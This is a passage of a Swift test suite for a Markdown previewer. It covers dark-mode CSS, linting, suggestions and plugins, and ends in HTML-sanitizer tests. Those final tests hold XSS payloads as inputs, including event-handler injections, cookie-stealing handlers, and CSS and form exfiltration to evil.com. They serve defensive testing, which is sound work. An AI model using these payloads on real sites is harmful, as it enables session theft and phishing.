              "Dark mode inline code must set explicit text color (not just background)")
}

// MARK: - Auto-Parsed CSS Dark Mode Coverage

runner.test("dark mode auto-coverage: every styled element has dark override") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let css = extractCSS(from: full)
    let (lightCSS, darkCSS) = splitLightDarkCSS(css)

    let lightRules = parseCSSRules(lightCSS)
    let darkRules = parseCSSRules(darkCSS)

    // Build a set of dark-mode selectors → properties for lookup
    var darkOverrides: [String: Set<String>] = [:]
    for rule in darkRules {
        let normalizedSelector = rule.selector
            .trimmingCharacters(in: .whitespacesAndNewlines)
        let props = Set(rule.properties.keys.filter { visualProperties.contains($0) })
        if !props.isEmpty {
            darkOverrides[normalizedSelector, default: []].formUnion(props)
        }
    }

    // Selectors that intentionally don't need dark overrides
    let exemptSelectors: Set<String> = [
        "pre code",          // covered by `pre` dark override
        "a:hover",           // inherits from `a` dark override
        ":root",             // color-scheme declaration, not visual
        "img",               // no color properties
        "input[type=\"checkbox\"]", // native control
    ]

    // CSS shorthand → longhand relationships: if dark mode sets any of the longhands,
    // that counts as covering the shorthand's visual aspects
    let shorthandCoverage: [String: [String]] = [
        "border": ["border-color", "border-top-color", "border-right-color", "border-bottom-color", "border-left-color"],
        "border-top": ["border-top-color"],
        "border-right": ["border-right-color"],
        "border-bottom": ["border-bottom-color"],
        "border-left": ["border-left-color"],
    ]

    /// Check if a light selector is covered by a more specific dark selector.
    /// E.g., `code { background }` is covered by `code:not([class*="language-"]) { background }`
    /// combined with `pre { background }` (since code inside pre uses pre's background).
    func selectorCoveredBySpecific(_ lightSel: String, prop: String) -> Bool {
        // `code` is covered for background: code:not(language) handles inline code,
        // and pre handles code blocks (pre code has background: none in light mode)
        if lightSel == "code" && prop == "background" {
            return darkOverrides.keys.contains(where: { $0.hasPrefix("code:not(") })
                && darkOverrides.keys.contains(where: { $0 == "pre" })
        }
        return false
    }

    var missing: [String] = []
    for rule in lightRules {
        let selector = rule.selector.trimmingCharacters(in: .whitespacesAndNewlines)

        // Skip exempt selectors
        if exemptSelectors.contains(selector) { continue }
        if selector.hasPrefix("@") { continue } // skip nested @media (e.g. @media print)

        // Find visual properties in this light rule
        let lightVisualProps = rule.properties.keys.filter { visualProperties.contains($0) }
        if lightVisualProps.isEmpty { continue }

        // Collect all dark-mode properties for this selector (exact + combined group match)
        var foundDarkProps: Set<String> = darkOverrides[selector] ?? []
        for (darkSel, darkProps) in darkOverrides {
            let darkParts = darkSel.components(separatedBy: ",").map { $0.trimmingCharacters(in: .whitespaces) }
            let lightParts = selector.components(separatedBy: ",").map { $0.trimmingCharacters(in: .whitespaces) }
            if lightParts.allSatisfy({ lp in darkParts.contains(lp) }) {
                foundDarkProps.formUnion(darkProps)
            }
        }

        for prop in lightVisualProps {
            if foundDarkProps.contains(prop) { continue }

            // Check shorthand → longhand coverage (e.g., border covered by border-color)
            if let longhands = shorthandCoverage[prop], longhands.contains(where: { foundDarkProps.contains($0) }) {
                continue
            }

            // Check if inheritable property is covered by body
            let inheritableProps: Set<String> = ["color"]
            if inheritableProps.contains(prop) && selector != "body" && darkOverrides["body"]?.contains(prop) == true {
                continue
            }

            // Check if a more specific dark selector covers this
            if selectorCoveredBySpecific(selector, prop: prop) { continue }

            missing.append("\(selector) { \(prop) }")
        }
    }

    if !missing.isEmpty {
        let report = missing.map { "  - \($0)" }.joined(separator: "\n")
        throw TestError.assertionFailed("Dark mode missing overrides for \(missing.count) light-mode visual properties:\n\(report)")
    }
}

runner.test("tables use max-content width not 100%") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    // Tables should fit content (GitHub Primer: width: max-content; max-width: 100%)
    try expect(full.contains("max-content"), "Tables should use width: max-content")
    try expect(full.contains("max-width: 100%"), "Tables should cap at 100% to prevent overflow")
}

// MARK: - Tier 3: Renderer Determinism Tests

print("\n=== Tier 3: Renderer Determinism ===")

runner.test("same input always produces identical output") {
    let md = try loadFixture("basic.md")
    let results = (0..<5).map { _ in MarkdownRenderer.renderHTML(from: md) }
    for i in 1..<results.count {
        try expect(results[i] == results[0], "Non-deterministic output on render \(i)")
    }
}

runner.test("renderer is thread-safe (concurrent renders)") {
    let md = try loadFixture("basic.md")
    let group = DispatchGroup()
    let queue = DispatchQueue(label: "test-concurrent", attributes: .concurrent)
    nonisolated(unsafe) var results = [String?](repeating: nil, count: 10)
    let lock = NSLock()

    for i in 0..<10 {
        group.enter()
        queue.async {
            let html = MarkdownRenderer.renderHTML(from: md)
            lock.lock()
            results[i] = html
            lock.unlock()
            group.leave()
        }
    }
    group.wait()

    let first = results[0]!
    for i in 1..<10 {
        try expect(results[i] == first, "Concurrent render \(i) produced different output")
    }
}

// MARK: - Tier 3: HTML Output Structural Validation

print("\n=== Tier 3: HTML Structural Validation ===")

runner.test("no unclosed tags in rendered HTML") {
    // Check that key block-level tags are balanced in fixture output
    // Uses regex to properly match opening tags (not content inside code blocks)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)

        // Only check tags that are unambiguous block-level elements
        // Skip <p> because cmark can produce <p> tags that get split by other elements
        let tagsToCheck = ["h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "table", "ul", "ol"]
        for tag in tagsToCheck {
            // Count opening tags: <tag> or <tag ...>
            var openCount = 0
            var searchRange = html.startIndex..<html.endIndex
            while let range = html.range(of: "<\(tag)[ >]", options: .regularExpression, range: searchRange) {
                openCount += 1
                searchRange = range.upperBound..<html.endIndex
            }
            let closeCount = html.components(separatedBy: "</\(tag)>").count - 1
            if openCount > 0 {
                try expect(openCount == closeCount,
                    "Unbalanced <\(tag)> in \(name).md: \(openCount) open, \(closeCount) close")
            }
        }
    }
}

runner.test("special characters are properly escaped") {
    let md = "Text with <angle> brackets & ampersand"
    let html = MarkdownRenderer.renderHTML(from: md)
    // cmark should escape these in text nodes (CMARK_OPT_UNSAFE allows HTML blocks but text nodes are still escaped)
    try expect(!html.contains("<angle>") || html.contains("&lt;angle&gt;") || html.contains("&amp;"),
               "Special chars not properly escaped")
}

runner.test("all fixtures produce non-empty output") {
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)
        try expect(!html.isEmpty, "\(name).md produced empty output")
        try expect(html.count > 10, "\(name).md produced suspiciously short output: \(html.count) chars")
    }
}

// MARK: - Tier 3: Performance Regression Gate

print("\n=== Tier 3: Performance Regression Gate ===")

runner.test("all fixtures render under 100ms") {
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let start = CFAbsoluteTimeGetCurrent()
        _ = MarkdownRenderer.renderHTML(from: md)
        let elapsed = (CFAbsoluteTimeGetCurrent() - start) * 1000
        try expect(elapsed < 100, "\(name).md took \(String(format: "%.1f", elapsed))ms (limit: 100ms)")
    }
}

runner.test("full template wrapping under 5ms") {
    let body = "<p>Hello</p>"
    let start = CFAbsoluteTimeGetCurrent()
    for _ in 0..<100 {
        _ = MarkdownRenderer.wrapInTemplate(body)
    }
    let avgMs = (CFAbsoluteTimeGetCurrent() - start) * 1000 / 100
    try expect(avgMs < 5, "Template wrapping: \(String(format: "%.2f", avgMs))ms avg (limit: 5ms)")
}

runner.test("debounce-simulated rapid renders stay under budget") {
    // Simulate 20 rapid re-renders (as if user is typing fast)
    let md = try loadFixture("basic.md")
    let start = CFAbsoluteTimeGetCurrent()
    for _ in 0..<20 {
        _ = MarkdownRenderer.renderHTML(from: md)
    }
    let totalMs = (CFAbsoluteTimeGetCurrent() - start) * 1000
    let avgMs = totalMs / 20
    print("    20 rapid renders: \(String(format: "%.1f", totalMs))ms total, \(String(format: "%.2f", avgMs))ms avg")
    try expect(avgMs < 50, "Rapid render avg \(String(format: "%.1f", avgMs))ms exceeds 50ms budget")
}


// MARK: - Linter Tests

print("\n=== Linter Tests ===")

let linter = MarkdownLinter()

func loadLintFixture(_ name: String) throws -> String {
    guard let url = Bundle.module.url(forResource: name, withExtension: "md", subdirectory: "Fixtures/lint") else {
        throw TestError.fixtureNotFound("lint/\(name).md")
    }
    return try String(contentsOf: url, encoding: .utf8)
}

// Rule detection tests (positive)

runner.test("linter detects inconsistent headings") {
    let md = try loadLintFixture("inconsistent-headings")
    let diags = linter.lint(md, rules: [.inconsistentHeadings])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .inconsistentHeadings, "Wrong rule: \(diags[0].rule)")
}

runner.test("linter detects trailing whitespace") {
    let md = "# Title\nHello   \nWorld\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.count >= 1, "Expected at least 1 trailing whitespace diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .trailingWhitespace, "Wrong rule")
}

runner.test("linter detects missing blank lines") {
    let md = try loadLintFixture("missing-blank-lines")
    let diags = linter.lint(md, rules: [.missingBlankLines])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .missingBlankLines, "Wrong rule")
}

runner.test("linter detects duplicate headings") {
    let md = try loadLintFixture("duplicate-headings")
    let diags = linter.lint(md, rules: [.duplicateHeadings])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .duplicateHeadings, "Wrong rule")
}

runner.test("linter detects broken links") {
    let md = try loadLintFixture("broken-links")
    let diags = linter.lint(md, rules: [.brokenLinks])
    try expect(diags.count == 1, "Expected 1 broken link, got \(diags.count)")
    try expect(diags[0].message.contains("missing-ref"), "Should reference 'missing-ref'")
}

runner.test("linter detects unclosed fences") {
    let md = try loadLintFixture("unclosed-fences")
    let diags = linter.lint(md, rules: [.unclosedFences])
    try expect(diags.count == 1, "Expected 1 unclosed fence, got \(diags.count)")
    try expect(diags[0].severity == .error, "Unclosed fence should be error")
}

runner.test("linter detects unclosed formatting") {
    let md = try loadLintFixture("unclosed-formatting")
    let diags = linter.lint(md, rules: [.unclosedFormatting])
    try expect(diags.count >= 2, "Expected at least 2 diagnostics (bold + strikethrough), got \(diags.count)")
}

runner.test("linter detects mismatched brackets") {
    let md = try loadLintFixture("mismatched-brackets")
    let diags = linter.lint(md, rules: [.mismatchedBrackets])
    try expect(diags.count >= 1, "Expected at least 1 mismatched bracket, got \(diags.count)")
    try expect(diags[0].severity == .error, "Mismatched bracket should be error")
}

runner.test("linter detects invalid tables") {
    let md = try loadLintFixture("invalid-tables")
    let diags = linter.lint(md, rules: [.invalidTables])
    try expect(diags.count >= 1, "Expected at least 1 invalid table row, got \(diags.count)")
}

// Negative tests (clean file)

runner.test("linter produces no diagnostics for clean file") {
    let md = try loadLintFixture("clean")
    let diags = linter.lint(md)
    try expect(diags.isEmpty, "Clean file should have no diagnostics, got \(diags.count): \(diags.map { "\($0.rule.rawValue) L\($0.line)" })")
}

runner.test("linter clean: no inconsistent headings in proper hierarchy") {
    let md = "# H1\n\n## H2\n\n### H3\n"
    let diags = linter.lint(md, rules: [.inconsistentHeadings])
    try expect(diags.isEmpty, "Proper heading hierarchy should produce no diagnostics")
}

runner.test("linter clean: no trailing whitespace") {
    let md = "# Title\n\nNo trailing spaces here.\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.isEmpty, "No trailing whitespace should produce no diagnostics")
}

runner.test("linter allows 2-space line break") {
    let md = "Line with break  \nNext line\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.isEmpty, "2-space line break should not be flagged")
}

runner.test("linter clean: no broken links when refs defined") {
    let md = "Click [here][ref] for info.\n\n[ref]: https://example.com\n"
    let diags = linter.lint(md, rules: [.brokenLinks])
    try expect(diags.isEmpty, "Valid reference links should produce no diagnostics")
}

runner.test("linter clean: closed code fences") {
    let md = "```swift\nlet x = 1\n```\n"
    let diags = linter.lint(md, rules: [.unclosedFences])
    try expect(diags.isEmpty, "Closed fences should produce no diagnostics")
}

runner.test("linter clean: balanced formatting") {
    let md = "This is **bold** and ~~struck~~.\n"
    let diags = linter.lint(md, rules: [.unclosedFormatting])
    try expect(diags.isEmpty, "Balanced formatting should produce no diagnostics")
}

runner.test("linter clean: valid links") {
    let md = "A [valid link](https://example.com) works.\n"
    let diags = linter.lint(md, rules: [.mismatchedBrackets])
    try expect(diags.isEmpty, "Valid links should produce no diagnostics")
}

runner.test("linter clean: consistent table columns") {
    let md = "| A | B |\n|---|---|\n| 1 | 2 |\n"
    let diags = linter.lint(md, rules: [.invalidTables])
    try expect(diags.isEmpty, "Consistent tables should produce no diagnostics")
}

// Integration tests

runner.test("linter diagnostics are sorted by line") {
    let md = "Some text\n# Heading\n**unclosed\n"
    let diags = linter.lint(md)
    for i in 1..<diags.count {
        try expect(diags[i].line >= diags[i-1].line, "Diagnostics should be sorted by line")
    }
}

runner.test("linter with empty input") {
    let diags = linter.lint("")
    try expect(diags.isEmpty, "Empty input should produce no diagnostics")
}

// MARK: - Linter Auto-Fix Tests

print("\n=== Linter Auto-Fix Tests ===")

runner.test("autoFix removes trailing whitespace") {
    let md = "# Title\nHello   \nWorld\n"
    let fixed = linter.autoFix(md)
    try expect(!fixed.contains("Hello   "), "Trailing whitespace should be removed")
    try expect(fixed.contains("Hello\n"), "Content should be preserved without trailing spaces")
}

runner.test("autoFix preserves 2-space line breaks") {
    let md = "Line with break  \nNext line\n"
    let fixed = linter.autoFix(md)
    try expect(fixed.contains("break  \n"), "2-space line break must be preserved")
}

runner.test("autoFix adds blank lines before headings") {
    let md = "Some text\n## Heading\n"
    let fixed = linter.autoFix(md)
    let lines = fixed.components(separatedBy: "\n")
    // Find the heading line index
    if let headingIdx = lines.firstIndex(where: { $0.hasPrefix("## ") }) {
        try expect(headingIdx > 0, "Heading should not be first line after fix")
        let prevLine = lines[headingIdx - 1]
        try expect(prevLine.trimmingCharacters(in: .whitespaces).isEmpty,
            "Blank line should be inserted before heading")
    } else {
        throw TestError.assertionFailed("Heading not found in fixed output")
    }
}

runner.test("autoFix is idempotent") {
    let md = "# Title\n\nSome text   \nMore text\n## Sub\n"
    let fixed1 = linter.autoFix(md)
    let fixed2 = linter.autoFix(fixed1)
    try expect(fixed1 == fixed2, "Applying autoFix twice should produce same result")
}

runner.test("autoFix reduces lint warnings") {
    let md = "# Title\nSome text   \nMore text\n## Sub\n"
    let before = linter.lint(md)
    let fixed = linter.autoFix(md)
    let after = linter.lint(fixed)
    let beforeFixable = before.filter { MarkdownLinter.autoFixableRules.contains($0.rule) }.count
    let afterFixable = after.filter { MarkdownLinter.autoFixableRules.contains($0.rule) }.count
    try expect(afterFixable < beforeFixable,
        "Auto-fix should reduce fixable warnings (before: \(beforeFixable), after: \(afterFixable))")
}

runner.test("autoFix does not modify clean input") {
    let md = "# Title\n\nClean paragraph.\n\n## Sub\n\nAnother paragraph.\n"
    let fixed = linter.autoFix(md)
    try expect(fixed == md, "Clean input should not be modified by autoFix")
}

runner.test("autoFix handles empty input") {
    let fixed = linter.autoFix("")
    try expect(fixed == "", "Empty input should remain empty")
}

runner.test("autoFix handles content inside code fences") {
    let md = "```\nsome text   \nmore   \n```\n"
    let fixed = linter.autoFix(md)
    // Code fence content should still get trailing whitespace fixed
    // (the linter checks trailing whitespace globally, not just outside fences)
    try expect(fixed.contains("```"), "Code fences should be preserved")
}

runner.test("autoFixableRules contains expected rules") {
    try expect(MarkdownLinter.autoFixableRules.contains(.trailingWhitespace),
        "trailingWhitespace should be auto-fixable")
    try expect(MarkdownLinter.autoFixableRules.contains(.missingBlankLines),
        "missingBlankLines should be auto-fixable")
    try expect(!MarkdownLinter.autoFixableRules.contains(.brokenLinks),
        "brokenLinks should NOT be auto-fixable")
    try expect(!MarkdownLinter.autoFixableRules.contains(.unclosedFences),
        "unclosedFences should NOT be auto-fixable")
}


// MARK: - Auto-Suggest Tests

print("\n=== Auto-Suggest Tests ===")

let suggestions = MarkdownSuggestions()

runner.test("supported languages list has 18 entries") {
    try expect(MarkdownSuggestions.supportedLanguages.count == 18,
        "Expected 18 languages, got \(MarkdownSuggestions.supportedLanguages.count)")
}

runner.test("language suggestions filter by prefix") {
    let swiftResults = suggestions.suggestLanguages(prefix: "sw")
    try expect(swiftResults.count == 1, "Expected 1 match for 'sw', got \(swiftResults.count)")
    try expect(swiftResults[0].text == "swift", "Expected 'swift'")

    let jResults = suggestions.suggestLanguages(prefix: "j")
    try expect(jResults.count == 3, "Expected 3 matches for 'j' (java, javascript, json), got \(jResults.count)")
}

runner.test("language suggestions return all when empty prefix") {
    let all = suggestions.suggestLanguages()
    try expect(all.count == 18, "Expected all 18 languages, got \(all.count)")
}

runner.test("emoji lookup works") {
    try expect(suggestions.lookupEmoji(":rocket:") == "\u{1F680}", "rocket emoji")
    try expect(suggestions.lookupEmoji("star") == "\u{2B50}", "star emoji without colons")
    try expect(suggestions.lookupEmoji(":nonexistent:") == nil, "nonexistent emoji")
}

runner.test("emoji suggestions filter by prefix") {
    let results = suggestions.suggestEmoji(prefix: "th")
    try expect(results.count >= 2, "Expected at least 2 matches for 'th' (thinking, thumbsup, thumbsdown)")
    try expect(results.allSatisfy({ $0.kind == .emoji }), "All should be emoji kind")
}

runner.test("heading suggestions reflect document structure") {
    let doc = "# Title\n\n## Section\n\nSome text\n\n### Subsection\n"
    let results = suggestions.suggestHeadings(document: doc)
    try expect(results.count == 3, "Expected 3 heading levels, got \(results.count)")
    try expect(results[0].text == "# ", "First should be h1")
    try expect(results[1].text == "## ", "Second should be h2")
    try expect(results[2].text == "### ", "Third should be h3")
}

runner.test("heading suggestions with no headings returns empty") {
    let doc = "Just some plain text.\n"
    let results = suggestions.suggestHeadings(document: doc)
    try expect(results.isEmpty, "No headings should give empty suggestions")
}

runner.test("link suggestions reflect document references") {
    let doc = "Click [here][ref1] for info.\n\n[ref1]: https://example.com\n[docs]: https://docs.example.com/guide\n"
    let results = suggestions.suggestLinks(document: doc)
    try expect(results.count == 2, "Expected 2 reference links, got \(results.count)")
    let labels = results.map { $0.text }
    try expect(labels.contains("[ref1]"), "Should contain ref1")
    try expect(labels.contains("[docs]"), "Should contain docs")
}

runner.test("link suggestions with no refs returns empty") {
    let doc = "Just [inline](https://example.com) links.\n"
    let results = suggestions.suggestLinks(document: doc)
    try expect(results.isEmpty, "No reference definitions should give empty suggestions")
}

runner.test("suggestion kinds are correct") {
    let langSugg = suggestions.suggestLanguages(prefix: "swift")
    try expect(langSugg.first?.kind == .language, "Language suggestion kind")

    let emojiSugg = suggestions.suggestEmoji(prefix: "rock")
    try expect(emojiSugg.first?.kind == .emoji, "Emoji suggestion kind")

    let headSugg = suggestions.suggestHeadings(document: "# Title\n")
    try expect(headSugg.first?.kind == .heading, "Heading suggestion kind")

    let linkSugg = suggestions.suggestLinks(document: "[ref]: https://x.com\n")
    try expect(linkSugg.first?.kind == .link, "Link suggestion kind")
}

// MARK: - Plugin & Sanitizer Tests

print("\n=== Plugin & Sanitizer Tests ===")

let registry = PluginRegistry()
let sanitizer = HTMLSanitizer()

func loadPluginFixture(_ path: String) throws -> String {
    guard let url = Bundle.module.url(forResource: path, withExtension: nil, subdirectory: "Fixtures") else {
        throw TestError.fixtureNotFound(path)
    }
    return try String(contentsOf: url, encoding: .utf8)
}

// Plugin registry tests

runner.test("plugin registry: register and lookup") {
    let reg = PluginRegistry()
    let mdPlugin = MarkdownPlugin()
    reg.register(mdPlugin)
    try expect(reg.plugin(forExtension: "md") != nil, "Should find plugin for .md")
    try expect(reg.plugin(forExtension: "markdown") != nil, "Should find plugin for .markdown")
    try expect(reg.plugin(forExtension: "xyz") == nil, "Should not find plugin for .xyz")
}

runner.test("plugin registry: registered extensions") {
    let reg = PluginRegistry()
    reg.register(MarkdownPlugin())
    reg.register(CSVPlugin())
    let exts = reg.registeredExtensions
    try expect(exts.contains("md"), "Should contain md")
    try expect(exts.contains("csv"), "Should contain csv")
    try expect(exts.contains("tsv"), "Should contain tsv")
}

runner.test("plugin registry: clear") {
    let reg = PluginRegistry()
    reg.register(MarkdownPlugin())
    reg.clear()
    try expect(reg.plugin(forExtension: "md") == nil, "Should be empty after clear")
}

runner.test("plugin registry: case insensitive lookup") {
    let reg = PluginRegistry()
    reg.register(HTMLPlugin())
    try expect(reg.plugin(forExtension: "HTML") != nil, "Should find plugin for .HTML")
    try expect(reg.plugin(forExtension: "Html") != nil, "Should find plugin for .Html")
}

// Markdown plugin tests

runner.test("markdown plugin renders correctly") {
    let plugin = MarkdownPlugin()
    let html = plugin.render(source: "# Hello\n\n**Bold** text")
    try expect(hasTag("h1", in: html, containing: "Hello"), "Should contain heading")
    try expect(html.contains("<strong>Bold</strong>"), "Should contain bold")
}

runner.test("markdown plugin does not require JS") {
    let plugin = MarkdownPlugin()
    try expect(!plugin.requiresJSExecution, "Markdown should not require JS")
}

// CSV plugin tests

runner.test("CSV plugin renders simple table") {
    let csv = try loadPluginFixture("csv/simple.csv")
    let plugin = CSVPlugin()
    let html = plugin.render(source: csv)
    try expect(html.contains("<table>"), "Should contain table")
    try expect(html.contains("<th>Name</th>"), "Should contain header")
    try expect(html.contains("<td>Alice</td>"), "Should contain data cell")
    try expect(html.contains("<thead>"), "Should contain thead")
    try expect(html.contains("<tbody>"), "Should contain tbody")
}

runner.test("CSV plugin renders unicode") {
    let csv = try loadPluginFixture("csv/unicode.csv")
    let plugin = CSVPlugin()
    let html = plugin.render(source: csv)
    try expect(html.contains("<table>"), "Should contain table")
    try expect(html.contains("Bonjour"), "Should contain unicode text")
}

runner.test("CSV plugin escapes HTML in cells") {
    let plugin = CSVPlugin()
    let html = plugin.render(source: "Header\n<script>alert('xss')</script>")
    try expect(!html.contains("<script>"), "Should escape script tags in cells")
    try expect(html.contains("&lt;script&gt;"), "Should HTML-escape the content")
}

runner.test("CSV plugin handles empty input") {
    let plugin = CSVPlugin()
    let html = plugin.render(source: "")
    try expect(html.contains("Empty"), "Should indicate empty file")
}

// HTML sanitizer tests

runner.test("sanitizer strips script tags") {
    let html = "<p>Hello</p><script>alert('xss')</script><p>World</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<script"), "Should strip script tags")
    try expect(!clean.contains("alert"), "Should strip script content")
    try expect(clean.contains("<p>Hello</p>"), "Should preserve safe content")
    try expect(clean.contains("<p>World</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips event handlers") {
    let html = "<div onclick=\"alert('click')\">Click</div>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onclick"), "Should strip onclick")
    try expect(clean.contains("Click"), "Should preserve div text")
}

runner.test("sanitizer blocks javascript URIs") {
    let html = "<a href=\"javascript:alert('xss')\">Link</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("javascript:"), "Should block javascript: URI")
    try expect(clean.contains("blocked:"), "Should replace with blocked:")
}

runner.test("sanitizer strips iframes") {
    let html = "<p>Text</p><iframe src=\"https://evil.com\"></iframe><p>More</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<iframe"), "Should strip iframe tags")
    try expect(clean.contains("<p>Text</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips object/embed tags") {
    let html = "<object data=\"evil.swf\"></object><embed src=\"evil.swf\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<object"), "Should strip object tags")
    try expect(!clean.contains("<embed"), "Should strip embed tags")
}

runner.test("sanitizer preserves safe HTML") {
    let html = try loadPluginFixture("html/safe.html")
    let clean = sanitizer.sanitize(html)
    try expect(clean.contains("<h1>Hello World</h1>"), "Should preserve h1")
    try expect(clean.contains("<strong>bold</strong>"), "Should preserve bold")
    try expect(clean.contains("<li>Item 1</li>"), "Should preserve list items")
}

// Fixture-based sanitizer tests

runner.test("sanitizer: xss-attempt fixture is fully cleaned") {
    let html = try loadPluginFixture("html/xss-attempt.html")
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<script"), "No script tags should remain")
    try expect(!clean.contains("javascript:"), "No javascript: URIs should remain")
    try expect(!clean.contains("onerror"), "No event handlers should remain")
    try expect(!clean.contains("<iframe"), "No iframes should remain")
    try expect(clean.contains("Normal text"), "Safe content should remain")
}

runner.test("sanitizer: event-handlers fixture is cleaned") {
    let html = try loadPluginFixture("html/event-handlers.html")
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onclick"), "Should strip onclick")
    try expect(!clean.contains("onmouseover"), "Should strip onmouseover")
    try expect(!clean.contains("onload"), "Should strip onload")
    try expect(!clean.contains("onerror"), "Should strip onerror")
    try expect(clean.contains("Safe content"), "Should preserve safe content")
}

// =============================================================================
// XSS Bypass Vector Tests (Security Audit)
// =============================================================================

print("\n=== XSS Bypass Vector Tests ===")

// --- Vector 1: SVG tags ---

runner.test("sanitizer strips svg onload XSS") {
    let html = "<p>Safe</p><svg onload=alert(1)></svg><p>After</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg tags")
    try expect(!clean.contains("onload"), "Should strip onload handler")
    try expect(!clean.contains("alert"), "Should strip JS payload")
    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
}

// --- Vector 2: Style tag injection ---

runner.test("sanitizer strips style tags with CSS exfiltration") {
    let html = "<p>Safe</p><style>@import url('https://evil.com/steal?data=secret')</style>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<style"), "Should strip style tags")
    try expect(!clean.contains("@import"), "Should strip CSS import")
    try expect(!clean.contains("evil.com"), "Should strip malicious URL")
    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips style tags with expression") {
    let html = "<style>body { background: url('https://tracker.com/pixel') }</style>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<style"), "Should strip style tags")
    try expect(!clean.contains("tracker.com"), "Should strip tracking URL")
}

// --- Vector 3: Unquoted event handlers ---

runner.test("sanitizer strips unquoted onerror") {
    let html = "<img src=x onerror=alert(1)>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
    try expect(!clean.contains("alert"), "Should strip JS payload")
}

runner.test("sanitizer strips unquoted onload") {
    let html = "<body onload=alert(1)>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onload"), "Should strip unquoted onload")
}

runner.test("sanitizer strips unquoted onmouseover") {
    let html = "<div onmouseover=alert(document.cookie)>Hover me</div>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onmouseover"), "Should strip unquoted onmouseover")
    try expect(!clean.contains("document.cookie"), "Should strip cookie theft payload")
}

runner.test("sanitizer strips mixed quoted and unquoted handlers") {
    let html = "<img src=\"valid.png\" onerror=alert(1) onclick=\"steal()\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
    try expect(!clean.contains("onclick"), "Should strip quoted onclick")
    try expect(!clean.contains("alert"), "Should strip JS from unquoted handler")
    try expect(!clean.contains("steal"), "Should strip JS from quoted handler")
}

// --- Vector 4: Base tag injection ---

runner.test("sanitizer strips base tag") {
    let html = "<base href=\"https://evil.com/\"><a href=\"/login\">Login</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<base"), "Should strip base tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious base URL")
    try expect(clean.contains("<a href=\"/login\">Login</a>"), "Should preserve relative links")
}

runner.test("sanitizer strips self-closing base tag") {
    let html = "<base href=\"https://evil.com/\" />"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<base"), "Should strip self-closing base tags")
}

// --- Vector 5: Form/input tag injection (phishing) ---

runner.test("sanitizer strips form tags") {
    let html = "<form action=\"https://evil.com/steal\"><input type=\"password\" name=\"pw\"><input type=\"submit\" value=\"Login\"></form>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<form"), "Should strip form tags")
    try expect(!clean.contains("<input"), "Should strip input tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious action URL")
}

runner.test("sanitizer strips standalone input tags") {
    let html = "<p>Enter password:</p><input type=\"password\" name=\"pw\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<input"), "Should strip input tags")
    try expect(clean.contains("<p>Enter password:</p>"), "Should preserve paragraph")
}

runner.test("sanitizer strips textarea tags") {
    let html = "<textarea name=\"data\">Prefilled content</textarea>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<textarea"), "Should strip textarea tags")
}

runner.test("sanitizer strips button tags") {
    let html = "<button type=\"submit\">Submit</button>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<button"), "Should strip button tags")
}

runner.test("sanitizer strips select tags") {
    let html = "<select name=\"choice\"><option>A</option><option>B</option></select>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<select"), "Should strip select tags")
}

// --- Vector 6: Link tags ---

runner.test("sanitizer strips link tags") {
    let html = "<link rel=\"stylesheet\" href=\"https://evil.com/steal.css\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<link"), "Should strip link tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious stylesheet URL")
}

runner.test("sanitizer strips link with prefetch") {
    let html = "<link rel=\"prefetch\" href=\"https://evil.com/track\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<link"), "Should strip prefetch link tags")
}

// --- Vector 7: data: URI scheme ---

runner.test("sanitizer blocks data URI in href") {
    let html = "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("\"data:"), "Should block data: URI")
    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
}

runner.test("sanitizer blocks data URI in img src") {
    let html = "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">"
    let clean = sanitizer.sanitize(html)
